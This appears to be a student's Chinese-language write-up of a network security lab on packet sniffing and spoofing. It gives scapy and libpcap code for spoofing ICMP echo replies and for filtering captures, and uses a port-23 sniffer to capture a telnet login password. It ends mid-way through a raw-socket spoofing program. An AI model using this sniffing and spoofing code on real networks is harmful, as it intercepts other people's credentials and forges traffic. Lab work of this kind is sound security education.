<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_pkt</span>(<span class="params">pkt</span>):  </span><br><span class="line">    <span class="keyword">if</span> ICMP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[ICMP].<span class="built_in">type</span> == <span class="number">8</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Original Packet.......&quot;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Source IP : &quot;</span>, pkt[IP].src)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Destination IP:&quot;</span>, pkt[IP].dst)  </span><br><span class="line">  </span><br><span class="line">        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)  </span><br><span class="line">        icmp = ICMP(<span class="built_in">type</span>=<span class="number">0</span>, <span class="built_in">id</span>=pkt[ICMP].<span class="built_in">id</span>, seq=pkt[ICMP].seq)  </span><br><span class="line">        data = pkt[Raw].load  </span><br><span class="line">        newpkt = ip/icmp/data  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Spoofed Packet.......&quot;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Source IP : &quot;</span>, newpkt[IP].src)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Destination IP : &quot;</span>, newpkt[IP].dst)  </span><br><span class="line">        send(newpkt, verbose=<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-9ae40e75e337&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;icmp&#x27;</span>, prn=spoof_pkt)</span><br></pre></td></tr></table></figure>
<p>这段代码使用了Python的scapy库来操作网络数据包。它的主要目的是欺骗（spoof）ICMP数据包，即伪装数据包的源IP地址和目标IP地址。<br />1.2.3.4可以ping通<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700032219299-22a725d7-3d78-477b-84e8-3a71ba8825a1.png#averageHue=%232f2d2a&clientId=u7ee5117c-c78a-4&from=paste&height=138&id=u0d3c8a2b&originHeight=217&originWidth=682&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=35111&status=done&style=none&taskId=ucab5ab3a-3a92-4cd7-a925-ecc14d3a0ac&title=&width=433.0158926804509" alt="image.png"><br />10.9.0.99无法ping通<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700032262340-34c6b893-e92e-4eb9-bc93-fa238fd96442.png#averageHue=%23302e2b&clientId=u7ee5117c-c78a-4&from=paste&height=84&id=uba4201ab&originHeight=133&originWidth=694&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=22518&status=done&style=none&taskId=u0882fa24-343a-466b-8ca0-3ce9a3d5cfb&title=&width=440.6349406455028" alt="image.png"><br />8.8.8.8 可以ping通，存在DUP标志<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700032451153-3f352728-cbab-481a-bf75-dda42a761681.png#averageHue=%232f2d2b&clientId=u7ee5117c-c78a-4&from=paste&height=204&id=u7aba476b&originHeight=322&originWidth=766&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=56401&status=done&style=none&taskId=u96d385c9-69b6-48b4-9df7-0263d302206&title=&width=486.3492284358143" alt="image.png"><br><a name="XAZJ8"></a></p>
<h2 id="4-Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets"><a href="#4-Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets" class="headerlink" title="4 Lab Task Set 2: Writing Programs to Sniff and Spoof Packets"></a><strong>4 Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</strong></h2><p><a name="MXcjJ"></a></p>
<h3 id="4-1-Task-2-1-Writing-Packet-Sniffifing-Program"><a href="#4-1-Task-2-1-Writing-Packet-Sniffifing-Program" class="headerlink" title="4.1 Task 2.1: Writing Packet Sniffifing Program"></a><strong>4.1 Task 2.1: Writing Packet Sniffifing Program</strong></h3><blockquote>
<p>使用pcap库可以很容易地编写嗅探器程序。使用pcap，嗅探器的任务变成了调用pcap库中的一个简单的过程序列。在序列的最后，一旦数据包被捕获，就将被放入缓冲区中进行进一步处理。数据包捕获的所有细节都由pcap库处理。</p>
</blockquote>
<p><a name="Ux2Lj"></a></p>
<h4 id="Task-2-1A-Understanding-How-a-Sniffer-Works"><a href="#Task-2-1A-Understanding-How-a-Sniffer-Works" class="headerlink" title="**Task 2.1A: Understanding How a Sniffer Works **"></a>**Task 2.1A: Understanding How a Sniffer Works **</h4><blockquote>
<p>在这个任务中，学生需要编写一个嗅探程序来打印出每个捕获的数据包的源和目标IP地址。学生可以输入上面的代码或从种子书的网站上下载样本代码(<a target="_blank" rel="noopener" href="https://www.handsonsecurity.net/figurecode.html)%E5%AD%A6%E7%94%9F%E5%BA%94%E8%AF%A5%E6%8F%90%E4%BE%9B%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E4%BD%9C%E4%B8%BA%E8%AF%81%E6%8D%AE%EF%BC%8C%E4%BB%A5%E8%AF%81%E6%98%8E%E4%BB%96%E4%BB%AC%E7%9A%84%E5%97%85%E6%8E%A2%E7%A8%8B%E5%BA%8F%E8%83%BD%E5%A4%9F%E6%88%90%E5%8A%9F%E8%BF%90%E8%A1%8C%EF%BC%8C%E5%B9%B6%E4%BA%A7%E7%94%9F%E9%A2%84%E6%9C%9F%E7%9A%84%E7%BB%93%E6%9E%9C%E3%80%82">https://www.handsonsecurity.net/figurecode.html)学生应该提供屏幕截图作为证据，以证明他们的嗅探程序能够成功运行，并产生预期的结果。</a></p>
</blockquote>
<p>根据实验所给代码，完善代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u_char unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u_short unsigned short</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ethernet header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethheader</span> &#123;</span></span><br><span class="line">    u_char  ether_dhost[<span class="number">6</span>]; <span class="comment">/* destination host address */</span></span><br><span class="line">    u_char  ether_shost[<span class="number">6</span>]; <span class="comment">/* source host address */</span></span><br><span class="line">    u_short ether_type;     <span class="comment">/* protocol type (IP, ARP, RARP, etc) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>      iph_ihl:<span class="number">4</span>, <span class="comment">//IP header length</span></span><br><span class="line">    iph_ver:<span class="number">4</span>; <span class="comment">//IP version</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>      iph_tos; <span class="comment">//Type of service</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_len; <span class="comment">//IP Packet length (data + header)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_ident; <span class="comment">//Identification</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_flag:<span class="number">3</span>, <span class="comment">//Fragmentation flags</span></span><br><span class="line">    iph_offset:<span class="number">13</span>; <span class="comment">//Flags offset</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>      iph_ttl; <span class="comment">//Time to Live</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>      iph_protocol; <span class="comment">//Protocol type</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_chksum; <span class="comment">//IP datagram checksum</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_sourceip</span>;</span> <span class="comment">//Source IP address</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_destip</span>;</span>   <span class="comment">//Destination IP address</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">got_packet</span><span class="params">(u_char *args, <span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *header,</span></span><br><span class="line"><span class="params">                <span class="type">const</span> u_char *packet)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ethheader</span> *<span class="title">eth</span> =</span> (<span class="keyword">struct</span> ethheader *)packet;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ntohs(eth-&gt;ether_type) == <span class="number">0x0800</span>) &#123; <span class="comment">// 0x0800 is IP type</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> * <span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *)</span><br><span class="line">            (packet + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ethheader)); </span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;       From: %s\n&quot;</span>, inet_ntoa(ip-&gt;iph_sourceip));   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         To: %s\n&quot;</span>, inet_ntoa(ip-&gt;iph_destip));    </span><br><span class="line"></span><br><span class="line">        <span class="comment">/* determine protocol */</span></span><br><span class="line">        <span class="keyword">switch</span>(ip-&gt;iph_protocol) &#123;                                 </span><br><span class="line">            <span class="keyword">case</span> IPPROTO_TCP:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   Protocol: TCP\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">case</span> IPPROTO_UDP:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   Protocol: UDP\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">case</span> IPPROTO_ICMP:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   Protocol: ICMP\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   Protocol: others\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pcap_t</span> *handle;</span><br><span class="line">    <span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line">    <span class="type">char</span> filter_exp[] = <span class="string">&quot;tcp and dst portrange 10-100&quot;</span>;</span><br><span class="line">    bpf_u_int32 net;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 1: Open live pcap session on NIC with name enp0s3</span></span><br><span class="line">    handle = pcap_open_live(<span class="string">&quot;enp0s3&quot;</span>, BUFSIZ, <span class="number">1</span>, <span class="number">1000</span>, errbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;listening on network card, ret: %p...\n&quot;</span>, handle);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 2: Compile filter_exp into BPF psuedo-code</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;try to compile filter...\n&quot;</span>);</span><br><span class="line">    pcap_compile(handle, &amp;fp, filter_exp, <span class="number">0</span>, net);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;try to set filter...\n&quot;</span>);</span><br><span class="line">    pcap_setfilter(handle, &amp;fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 3: Capture packets</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start to sniff...\n&quot;</span>);</span><br><span class="line">    pcap_loop(handle, <span class="number">-1</span>, got_packet, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pcap_close(handle);   <span class="comment">//Close the handle</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码通过使用libpcap库来捕获指定条件的网络数据包，并对捕获到的数据包进行解析和处理：</p>
<ol>
<li>结构体定义：<ul>
<li>ethheader：以太网头部结构体，包含了目标主机地址、源主机地址和协议类型等信息。</li>
<li>ipheader：IP数据包头部结构体，包含了IP版本、长度、源IP地址、目标IP地址等信息。</li>
</ul>
</li>
<li>got_packet 函数：<ul>
<li>这是一个回调函数，当捕获到一个数据包时被调用。</li>
<li>函数的参数解释：<ul>
<li>args：用户传递的参数，这里没有使用。</li>
<li>header：捕获到的数据包的头部信息。</li>
<li>packet：捕获到的数据包的内容。</li>
</ul>
</li>
<li>函数的功能：<ul>
<li>通过解析数据包的以太网头部和IP头部，打印出源IP地址、目标IP地址和协议类型。</li>
</ul>
</li>
</ul>
</li>
<li>main 函数：<ul>
<li>程序的入口函数。</li>
<li>主要步骤：<ul>
<li>打开一个网络设备接口，准备开始捕获数据包。</li>
<li>编译并设置过滤器，只捕获目的端口在10到100之间的TCP数据包。</li>
<li>开始捕获数据包并调用 got_packet 函数进行处理。</li>
<li>循环捕获数据包直到程序结束。</li>
<li>关闭网络设备接口。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>使用如下命令编译：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o sniff sniff.c -lpcap</span><br></pre></td></tr></table></figure>

<p>运行代码，可以看到发送的包出现在结果中：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700373437696-275fce00-86c6-44e8-8c3b-19841dc34cb2.png#averageHue=%23222121&clientId=u453855c7-44f9-4&from=paste&height=340&id=u0fa1ecb8&originHeight=535&originWidth=869&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=52786&status=done&style=none&taskId=ueea1d2a0-eae2-45fc-81d0-8feb3247842&title=&width=551.74605680251" alt="image.png"></p>
<p>并尝试ping baidu.com：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700373333051-c0a23b05-dc53-47e0-b282-1c285b23cfea.png#averageHue=%23282625&clientId=u453855c7-44f9-4&from=paste&height=211&id=u393401b6&originHeight=333&originWidth=855&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=49895&status=done&style=none&taskId=uc481a6a5-733a-4e92-b3d2-84f0ff8aca6&title=&width=542.8571675099495" alt="image.png"></p>
<blockquote>
<p><strong>Q1: 描述在你的嗅探程序中的库函数的调用</strong><br>A1: 第一步，启动pcap监听网卡；第二步就是编译BPF过滤器并设置过滤器；第三步就是设置嗅探的处理函数；最后关闭嗅探即可。</p>
</blockquote>
<blockquote>
<p><strong>Q2: 为什么需要root权限才能运行嗅探程序？不使用root权限运行该程序会在哪里报错？</strong><br>A2: 嗅探数据包是一个高权限的操作，因为涉及到隐私，安全相关问题。如果普通用户也能嗅探数据包，那么他就能窃取别人的隐私，甚至盗取账号密码等等。不使用root权限运行该程序。对比如下，可以看到在没有权限时第一步监听网卡就失败了。</p>
</blockquote>
<blockquote>
<p><strong>Q3: 打开嗅探程序的混杂模式。打开和关闭这个模式有什么区别？</strong><br>A3: 使用混杂模式可以监听所在网段下其他机器的数据包，关闭则不能。打开混杂模式，可以监听到本网段的机器 ping baidu.com的数据包，关闭后则嗅探不到。</p>
</blockquote>
<p><a name="lwdGC"></a></p>
<h4 id="Task-2-1B-Writing-Filters"><a href="#Task-2-1B-Writing-Filters" class="headerlink" title="Task 2.1B: Writing Filters"></a><strong>Task 2.1B: Writing Filters</strong></h4><blockquote>
<p>请为您的嗅探器程序编写过滤器表达式，以捕获以下每一个内容。你可以在网上找到关于pcap过滤器的手册。在实验室报告中，您需要包括屏幕截图来在应用这些过滤器后显示结果。</p>
</blockquote>
<p>这部分还是复用 task 2.1A的代码，只是修改其中的过滤器而已。Pcap过滤器的例子</p>
<ul>
<li><strong>只捕捉两个特定主机之间的ICMP包</strong></li>
</ul>
<p>使用的过滤器为 icmp and src host 39.156.66.10 and dst host 10.0.2.15, 只捕捉从39.156.66.10（baidu的ip） 发送到 10.0.2.15的ICMP包<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700379272946-0f60ecbe-69c7-467b-85e2-a7bbdb480286.png#averageHue=%2326201f&clientId=u453855c7-44f9-4&from=paste&height=152&id=u4c7778e7&originHeight=240&originWidth=981&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=27041&status=done&style=none&taskId=ue036a88c-d569-433f-9471-11820cc49d6&title=&width=622.8571711429946" alt="image.png"></p>
<p>结果如下，可以看到全是从百度IP发送到 10.0.2.15的ICMP包，没有其他类型的包<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700377216577-452884d0-80a5-46eb-bf74-edfb8e94b8e8.png#averageHue=%23272625&clientId=u453855c7-44f9-4&from=paste&height=248&id=ua05b103a&originHeight=390&originWidth=854&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=53217&status=done&style=none&taskId=ub4b23a65-a086-4832-a2ed-1dc318730fe&title=&width=542.2222468461952" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700379525287-e5300d93-13dc-4798-8181-7ca098ba5f13.png#averageHue=%23212020&clientId=u453855c7-44f9-4&from=paste&height=446&id=ua78664b9&originHeight=702&originWidth=1042&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=58512&status=done&style=none&taskId=u883d7138-0bff-41f4-9c42-ee4aa188a44&title=&width=661.5873316320085" alt="image.png"></p>
<ul>
<li><strong>捕捉目的端口在10到100之间的TCP包</strong></li>
</ul>
<p>捕捉目的端口在10到100之间的TCP包：使用的过滤器为 tcp and dst portrange 10-100, 只捕捉TCP包 <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700377959196-b7dfd142-2b05-4e42-8967-9d1dff7dfdd4.png#averageHue=%23251f1f&clientId=u453855c7-44f9-4&from=paste&height=157&id=u0a0f7b56&originHeight=248&originWidth=736&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=24324&status=done&style=none&taskId=uff8a2324-227a-46da-b04e-186510bcdfb&title=&width=467.30160852318454" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700373437696-275fce00-86c6-44e8-8c3b-19841dc34cb2.png#averageHue=%23222121&from=url&height=319&id=TNV92&originHeight=535&originWidth=869&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&status=done&style=none&title=&width=517.53173828125"><br><a name="hXen4"></a></p>
<h4 id="Task-2-1C-Sniffifing-Passwords"><a href="#Task-2-1C-Sniffifing-Passwords" class="headerlink" title="Task 2.1C: Sniffifing Passwords"></a><strong>Task 2.1C: Sniffifing Passwords</strong></h4><blockquote>
<p>请显示如何使用你的嗅探程序捕获密码时，有人使用网络，你正在监控。您可能需要修改嗅探器代码，以打印出捕获的TCP数据包的数据部分（telnet使用TCP）。如果您打印出整个数据部分，然后手动标记密码（或其部分密码）的位置，这是可以接受的。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Begin sniffing...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line">    pkt.show()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(iface=<span class="string">&#x27;br-9ae40e75e337&#x27;</span>, sniff(<span class="built_in">filter</span>=<span class="string">&quot;tcp port 23&quot;</span>, prn=print_pkt))</span><br></pre></td></tr></table></figure>
<p>运行改代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 task2<span class="number">.1</span>c.py</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700469012790-8eca4c35-772c-4e5e-9f2a-b574f628f1f2.png#averageHue=%23242423&clientId=u61735c7f-ffb4-4&from=paste&height=57&id=uc1a393c7&originHeight=89&originWidth=733&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=10541&status=done&style=none&taskId=u9a293f5e-a2ca-4d9e-9711-4d84a2cd2be&title=&width=465.39684653192154" alt="image.png"><br />另一边远程登录10.9.0.5<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700469068927-417b0941-05f3-460d-b29b-2720c5bff46a.png#averageHue=%23252423&clientId=u61735c7f-ffb4-4&from=paste&height=342&id=u8c685edb&originHeight=538&originWidth=931&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=60745&status=done&style=none&taskId=u530c595b-93ff-4de7-8d3f-2e0b0ab67d0&title=&width=591.1111379552783" alt="image.png"><br />可以发现嗅探到了密码（捕捉时为单个字符）：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700468615090-56960614-50ef-4b23-99aa-d1ee7f2db75a.png#averageHue=%23232222&clientId=u61735c7f-ffb4-4&from=paste&height=55&id=u646befa3&originHeight=86&originWidth=373&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=2995&status=done&style=none&taskId=uda4594cd-8987-4a92-8529-39d1fca56a5&title=&width=236.8254075803639" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700468632476-22cf6f48-baa3-4170-8122-5f6d057bb8be.png#averageHue=%23242322&clientId=u61735c7f-ffb4-4&from=paste&height=57&id=u14790ea0&originHeight=116&originWidth=487&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=6296&status=done&style=none&taskId=u0a1582ed-6f2d-4b4f-b9c8-617bb1336d8&title=&width=238" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700468682304-f0da2019-3669-4bda-a856-fc35f95ab0da.png#averageHue=%23232222&clientId=u61735c7f-ffb4-4&from=paste&height=58&id=uc90acebe&originHeight=88&originWidth=361&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=3096&status=done&style=none&taskId=uaf5e9e16-7ff8-428d-9aa6-e0b9280a8d3&title=&width=238.20635986328125" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700468698500-e381229a-3e4d-4d00-a8ec-0cf1545b6c83.png#averageHue=%23232221&clientId=u61735c7f-ffb4-4&from=paste&height=51&id=ub73be01b&originHeight=80&originWidth=391&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=3102&status=done&style=none&taskId=u3d54a4a2-000d-4b97-97f3-57f6f539d46&title=&width=248.2539795279418" alt="image.png"><br><a name="BaA5K"></a></p>
<h3 id="4-2-Task-2-2-Spoofifing"><a href="#4-2-Task-2-2-Spoofifing" class="headerlink" title="4.2 Task 2.2: Spoofifing"></a><strong>4.2 Task 2.2: Spoofifing</strong></h3><blockquote>
<p>当普通用户发送数据包时，操作系统通常不允许用户设置协议头中的所有字段（如TCP、UDP和IP头）。操作系统将设置大部分字段，而只允许用户设置几个字段，如目标IP地址、目标端口号等。但是，如果用户具有根权限，那么他们可以在数据包头中设置任何任意字段。这被称为数据包欺骗，它可以通过原始套接字来完成。原始套接字为程序员提供了对包构造的绝对控制，允许程序员构造任意的包，包括设置头字段和有效负载。使用原始套接字非常简单；它涉及四个步骤： (1)创建一个原始套接字，(2)设置套接字选项，(3)构造数据包，以及(4)通过原始套接字发送数据包。有许多在线教程可以教你如何在C编程中使用原始套插字。我们已经将一些教程链接到该实验室的网页上。请阅读它们，并学习如何编写一个数据包欺骗程序。我们展示了这样一个程序的一个简单的框架。</p>
</blockquote>
<p><a name="ldrV2"></a></p>
<h4 id="Task-2-2A-Write-a-spoofifing-program"><a href="#Task-2-2A-Write-a-spoofifing-program" class="headerlink" title="Task 2.2A: Write a spoofifing program."></a><strong>Task 2.2A: Write a spoofifing program.</strong></h4><blockquote>
<p>请用c编写您自己的数据包欺骗程序。您需要提供证据（例如，有线鲨鱼数据包跟踪），以表明您的程序成功地发送了欺骗的IP数据包。</p>
</blockquote>
<p>这部分主要是伪造IP包。这里伪造是UDP包, 代码如下(<strong>spoof.c</strong>）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myheader.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************************</span></span><br><span class="line"><span class="comment">Given an IP packet, send it out using a raw socket.</span></span><br><span class="line"><span class="comment">**************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_ip_packet</span><span class="params">(<span class="keyword">struct</span> ipheader* ip)</span></span><br><span 